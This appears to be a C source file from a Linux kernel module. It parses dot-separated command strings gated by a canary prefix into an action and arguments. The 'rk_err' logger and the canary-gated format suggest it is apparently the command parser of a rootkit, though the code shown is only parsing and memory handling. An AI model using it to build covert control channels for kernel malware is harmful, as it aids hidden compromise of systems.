#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/string.h>

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

#include "../../../logger/logger.h"
#include "parser.h"

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

int parse_command(const char *command, char **action, char ***argv, int *argc) {
    char *command_copy = kstrdup(command, GFP_KERNEL);
    const char *original_command_copy = command_copy;

    if (command_copy == NULL) {
        rk_err("[parse_command] memory allocation failed for command_copy\n");
        return -ENOMEM;
    }

    *argc = 0;
    *argv = NULL;
    *action = NULL;

    const char *canary_token = strsep(&command_copy, ".");

    if (canary_token == NULL || strcmp(canary_token, CANARY_PREFIX) != 0) {
        rk_err("[parse_command] command does not start with '%s', ignoring...\n", CANARY_PREFIX);

        kfree(original_command_copy);

        return -EINVAL;
    }

    char *token = strsep(&command_copy, ".");

    if (token != NULL) {
        *action = kstrdup(token, GFP_KERNEL);
        if (*action == NULL) {
            rk_err("[parse_command] memory allocation failed for action\n");
            kfree(original_command_copy);
            return -ENOMEM;
        }

        while ((token = strsep(&command_copy, ".")) != NULL) {
            if (strlen(token) == 0) {
                continue;
            }

            char **temp_argv = krealloc(*argv, (*argc + 1) * sizeof(char *), GFP_KERNEL);

            if (temp_argv == NULL) {
                rk_err("[parse_command] memory re-allocation failed for argv\n");

                free_parsed_command(*action, *argv, *argc);
                kfree(original_command_copy);

                return -ENOMEM;
            }
            *argv = temp_argv;

            (*argv)[*argc] = kstrdup(token, GFP_KERNEL);

            if ((*argv)[*argc] == NULL) {
                rk_err("[parse_command] memory allocation failed for argv[%d]\n", *argc);

                free_parsed_command(*action, *argv, *argc);
                kfree(original_command_copy);

                return -ENOMEM;
            }
            (*argc)++;
        }
    } else {
        rk_err("[parse_command] no action found after canary prefix\n");

        kfree(original_command_copy);

        return -EINVAL;
    }

    kfree(original_command_copy);

    return 0;
}

// ////////////////////////////////////////////////////////////////////

void free_parsed_command(const char *action, char **argv, const int argc) {
    kfree(action);

    for (int i = 0; i < argc; i++) {
        kfree(argv[i]);
    }

    kfree(argv);
}

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////